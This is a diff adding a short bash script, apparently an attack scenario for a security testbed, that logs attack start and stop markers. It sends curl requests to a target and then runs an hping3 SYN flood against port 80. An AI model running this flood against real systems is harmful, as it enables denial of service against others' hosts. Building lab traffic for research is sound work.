@@ -1,0 +1,38 @@
+#!/bin/bash
+
+# Check if $1 and $2 are defined, otherwise abort
+if [ -z "$1" ] || [ -z "$2" ]
+then
+    echo "Usage: $0 <target> <iname> [wait_time]"
+    exit 1
+fi
+
+target=$1
+iname=$2
+
+# if $3 is defined, then use it as the wait time
+if [ -z "$3" ]
+then
+    wait_time=10
+else
+    wait_time=$3
+fi
+
+echo "Executing nmap ping-wait-scan.sh with target=$target, iname=$iname, wait_time=$wait_time"
+
+sleep $wait_time
+
+echo "Executing 20 curl requests to the $target ..."
+mentored-registry-action -a check-attack -o /app/results/ -n "Starting 20 curl requests to $target"
+for i in {1..20}
+do
+    curl -s $target > /dev/null
+done
+mentored-registry-action -a end-check-attack -o /app/results/ -n "Stopping 20 curl requests to $target"
+
+echo "Running hping http flood attack..."
+# mentored-attack hping3 $target $iname -S -p 80 -s 80 -d 120 -c 1000
+mentored-attack hping3 $target $iname -S --flood -p 80 -d 1024
+mentored-registry-action -a end-attack -o /app/results/ -n "Stopping hping http flood attack to $target"
+
+tail -f /dev/null
